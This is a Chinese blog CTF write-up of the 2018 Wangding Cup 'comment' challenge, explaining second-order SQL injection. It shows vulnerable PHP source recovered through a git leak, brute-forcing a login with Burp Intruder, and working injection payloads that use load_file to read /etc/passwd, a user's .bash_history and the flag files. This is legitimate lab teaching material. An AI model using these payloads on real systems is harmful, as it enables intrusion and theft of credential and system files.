<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>二次注入（2018网鼎杯comment） - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/cf8176cd63f6fc7ae5fd51fde3caa6c1/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="二次注入（2018网鼎杯comment）">
  <meta property="og:description" content="目录
一、2018网鼎杯comment
1.二次注入概念：
2.进入靶机：
4. Burp Suite暴力破解
5.对文件进行恢复，查看源码
6.二次注入
7.成功拿到flag
一、2018网鼎杯comment 该题主要考察二次注入
1.二次注入概念： 攻击者构造恶意的数据并存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。即输入恶意的数据库查询语句时会被转义，但在数据库调用读取语句时又被还原导致语句执行。
进入网站：BUUCTF在线评测
搜索comment
2.进入靶机： 4. Burp Suite暴力破解 点击发布，会出现登陆界面
此时密码后三位被隐藏，我们可以使用Burp Suite中的Intruder模块进行暴力破解 根据长度判断后三位正确密码为666，得到密码后返回登陆界面，进入靶机。 5.对文件进行恢复，查看源码 通过对目录进行扫描，发现存在git泄露，通过githacker工具将文件恢复一下，得到源码。
//write_do.php
&lt;?php
include &#34;mysql.php&#34;;
session_start();
if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){
header(&#34;Location: ./login.php&#34;);
die();
}
if(isset($_GET[&#39;do&#39;])){
switch ($_GET[&#39;do&#39;])
{
case &#39;write&#39;:
$category = addslashes($_POST[&#39;category&#39;]);
$title = addslashes($_POST[&#39;title&#39;]);
$content = addslashes($_POST[&#39;content&#39;]);
$sql = &#34;insert into board
set category = &#39;$category&#39;,
title = &#39;$title&#39;,
content = &#39;$content&#39;&#34;;
$result = mysql_query($sql);">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-06T09:38:21+08:00">
    <meta property="article:modified_time" content="2024-08-06T09:38:21+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">二次注入（2018网鼎杯comment）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="-toc" style="margin-left:40px;"></p> 
<p id="%E4%B8%80%E3%80%812018%E7%BD%91%E9%BC%8E%E6%9D%AFcomment-toc" style="margin-left:40px;"><a href="#%E4%B8%80%E3%80%812018%E7%BD%91%E9%BC%8E%E6%9D%AFcomment" rel="nofollow">一、2018网鼎杯comment</a></p> 
<p id="1.%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E6%A6%82%E5%BF%B5%EF%BC%9A-toc" style="margin-left:80px;"><a href="#1.%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E6%A6%82%E5%BF%B5%EF%BC%9A" rel="nofollow">1.二次注入概念：</a></p> 
<p id="2.%E8%BF%9B%E5%85%A5%E9%9D%B6%E6%9C%BA%EF%BC%9A-toc" style="margin-left:80px;"><a href="#2.%E8%BF%9B%E5%85%A5%E9%9D%B6%E6%9C%BA%EF%BC%9A" rel="nofollow">2.进入靶机：</a></p> 
<p id="4.%20Burp%20Suite%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-toc" style="margin-left:80px;"><a href="#4.%20Burp%20Suite%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3" rel="nofollow">4. Burp Suite暴力破解</a></p> 
<p id="5.%E5%AF%B9%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%81%A2%E5%A4%8D%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81-toc" style="margin-left:80px;"><a href="#5.%E5%AF%B9%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%81%A2%E5%A4%8D%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81" rel="nofollow">5.对文件进行恢复，查看源码</a></p> 
<p id="6.%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-toc" style="margin-left:80px;"><a href="#6.%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5" rel="nofollow">6.二次注入</a></p> 
<p id="%C2%A07.%E6%88%90%E5%8A%9F%E6%8B%BF%E5%88%B0flag-toc" style="margin-left:80px;"><a href="#%C2%A07.%E6%88%90%E5%8A%9F%E6%8B%BF%E5%88%B0flag" rel="nofollow"> 7.成功拿到flag</a></p> 
<hr id="hr-toc"> 
<p></p> 
<h3 id="%E4%B8%80%E3%80%812018%E7%BD%91%E9%BC%8E%E6%9D%AFcomment">一、2018网鼎杯comment</h3> 
<p>该题主要考察二次注入</p> 
<h4 id="1.%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E6%A6%82%E5%BF%B5%EF%BC%9A">1.二次注入概念：</h4> 
<p>攻击者构造恶意的数据并存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。即输入恶意的数据库查询语句时会被转义，但在数据库调用读取语句时又被还原导致语句执行。</p> 
<p>进入网站：<a href="https://buuoj.cn/" rel="nofollow" title="BUUCTF在线评测">BUUCTF在线评测</a></p> 
<p>搜索comment</p> 
<p><img alt="" height="290" src="https://images2.imgbox.com/37/66/bav0te48_o.png" width="559"></p> 
<h4 id="2.%E8%BF%9B%E5%85%A5%E9%9D%B6%E6%9C%BA%EF%BC%9A">2.进入靶机：</h4> 
<p><img alt="" height="392" src="https://images2.imgbox.com/13/e8/0Z4NwTki_o.png" width="361"></p> 
<h4 id="4.%20Burp%20Suite%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3">4. Burp Suite暴力破解</h4> 
<p><img alt="" height="292" src="https://images2.imgbox.com/35/ae/9CRLzsQ1_o.png" width="1200"> 点击发布，会出现登陆界面</p> 
<p> 此时密码后三位被隐藏，我们可以使用Burp Suite中的Intruder模块进行暴力破解 </p> 
<p><img alt="" height="292" src="https://images2.imgbox.com/8c/69/XU0VY4nY_o.png" width="802"></p> 
<p></p> 
<p> 根据长度判断后三位正确密码为666，得到密码后返回登陆界面，进入靶机。 </p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/d1/91/TjDCAfqP_o.png" width="1200"></p> 
<h4 id="5.%E5%AF%B9%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%81%A2%E5%A4%8D%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81">5.对文件进行恢复，查看源码</h4> 
<p>通过对目录进行扫描，发现存在git泄露，通过githacker工具将文件恢复一下，得到源码。</p> 
<blockquote> 
 <p>//write_do.php<br> &lt;?php<br> include "mysql.php";<br> session_start();<br> if($_SESSION['login'] != 'yes'){<!-- --><br>     header("Location: ./login.php");<br>     die();<br> }<br> if(isset($_GET['do'])){<!-- --><br> switch ($_GET['do'])<br> {<!-- --><br> case 'write':<br>     $category = addslashes($_POST['category']);<br>     $title = addslashes($_POST['title']);<br>     $content = addslashes($_POST['content']);<br>     $sql = "insert into board<br>             set category = '$category',<br>                 title = '$title',<br>                 content = '$content'";<br>     $result = mysql_query($sql);<br>     header("Location: ./index.php");<br>     break;<br> case 'comment':<br>     $bo_id = addslashes($_POST['bo_id']);<br>     $sql = "select category from board where id='$bo_id'";<br>     $result = mysql_query($sql);<br>     $num = mysql_num_rows($result);<br>     if($num&gt;0){<!-- --><br>     $category = mysql_fetch_array($result)['category'];<br>     $content = addslashes($_POST['content']);<br>     $sql = "insert into comment<br>             set category = '$category',<br>                 content = '$content',<br>                 bo_id = '$bo_id'";<br>     $result = mysql_query($sql);<br>     }<br>     header("Location: ./comment.php?id=$bo_id");<br>     break;<br> default:<br>     header("Location: ./index.php");<br> }<br> }<br> else{<!-- --><br>     header("Location: ./index.php");<br> }<br> ?&gt;</p> 
</blockquote> 
<p>可以看到addslashes给每个参数都进行了处理，但是数据库存入数据时会自动过滤，将转义字符丢弃，也就是数据还是会原样进入到数据库中。</p> 
<p><img alt="" height="439" src="https://images2.imgbox.com/46/9a/GqPD2RSv_o.png" width="620"></p> 
<h4 id="6.%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">6.二次注入</h4> 
<p> write指发帖，comment指发送评论。write下边，所有可控制的值都被addslashes转义了。但是comment下边，它把category值重新选取出来，并且没有进行过滤就带入了sql语句。很明显，这就是我们要找的注入点。这里注入就一定要绕过单引号。</p> 
<blockquote> 
 <p>case 'comment':<br>     $bo_id = addslashes($_POST['bo_id']);<br>     $sql = "select category from board where id='$bo_id'";<br>     $result = mysql_query($sql);<br>     $num = mysql_num_rows($result);<br>     if($num&gt;0){<!-- --><br>     $category = mysql_fetch_array($result)['category'];</p> 
</blockquote> 
<p></p> 
<p> 即使在write下单引号被转义。但是那个单引号再次被数据库选出来时，它又恢复了单引号的特殊含义。 现在category='1',content=database()。/*是php的注释符，将后边的引号注释掉。但是这么注释存在问题，我们构造了一个content，当然/*也要闭合掉一个content。</p> 
<blockquote> 
 <p>insert into comment<br>        set category = ' 1',content=user()，/*',<br>            content = '111',<br>            bo_id = '$bo_id'";</p> 
</blockquote> 
<p>content是评论的内容。在评论区提交*/#，/**/形成闭合后，将content注释掉了，同时也绕过了引号。注意#是单行注释</p> 
<blockquote> 
 <p>insert into comment<br>        set category = ' 1',content=user()，/*',<br>            content = '*/#',<br>            bo_id = '$bo_id'";</p> 
</blockquote> 
<p><img alt="" height="634" src="https://images2.imgbox.com/d6/a4/jUL1dNg0_o.png" width="1200"></p> 
<p>先读取/etc/passwd</p> 
<blockquote> 
 <p>',content=(select(load_file("/etc/passwd"))),/*</p> 
</blockquote> 
<p><img alt="" height="949" src="https://images2.imgbox.com/c0/20/PN5Hedt5_o.png" width="1200"></p> 
<p>发现存在www用户，读取用户的命令执行历史</p> 
<blockquote> 
 <p>',content=(select(load_file("/home/www/.bash_history"))),/*</p> 
</blockquote> 
<p><img alt="" height="673" src="https://images2.imgbox.com/fa/2d/4QfrBT9W_o.png" width="1200"></p> 
<p>先进入/tmp目录,解压缩了html.zip文件(得到/tmp/html)，之后将html.zip删除了，拷贝了一份html给了/var/www目录(得到/var/www/html)，之后将/var/www/html下的.DS_Store文件删除，但是/tmp/html下的.DS_Store文件没有删除,查看一下，然后因为这种文件直接读取通常存在乱码，所以要转进制读取才行。</p> 
<blockquote> 
 <p> ',content=(select hex(load_file("/tmp/html/.DS_Store"))),/*</p> 
</blockquote> 
<p><img alt="" height="642" src="https://images2.imgbox.com/62/11/jzMnbEys_o.png" width="1200"></p> 
<p>将上述得到的源码进行 ASCII hex解码得到flag_8946e1ff1ee3e40f.php</p> 
<p>所以尝试查看一下/tmp/html/flag_8946e1ff1ee3e40f.php</p> 
<blockquote> 
 <p>',content=(select hex(load_file("/tmp/html/flag_8946e1ff1ee3e40f.php"))),/*</p> 
</blockquote> 
<p><img alt="" height="718" src="https://images2.imgbox.com/05/88/KC6vkeue_o.png" width="1200"></p> 
<p> 这是一个假的flag，真的flag可能在/var/www/html目录下</p> 
<blockquote> 
 <p>    ',content=(select hex(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php"))),/*</p> 
</blockquote> 
<p><img alt="" height="634" src="https://images2.imgbox.com/1d/69/pmAJvEHU_o.png" width="1200"></p> 
<p>解码后得到</p> 
<p><img alt="" height="652" src="https://images2.imgbox.com/9e/00/Flh2p69j_o.png" width="1200"></p> 
<h4 id="%C2%A07.%E6%88%90%E5%8A%9F%E6%8B%BF%E5%88%B0flag"> 7.成功拿到flag</h4> 
<p><img alt="" height="613" src="https://images2.imgbox.com/e9/7d/l17dLpxC_o.png" width="498"></p> 
<p></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/aa414861daaa91d830ed97b30dd361bb/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">手撕数据结构之二叉树</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/2ac5b1b88547a7d8a751650fb5332b3c/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">遗传算法与深度学习实战——生命模拟及其应用</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>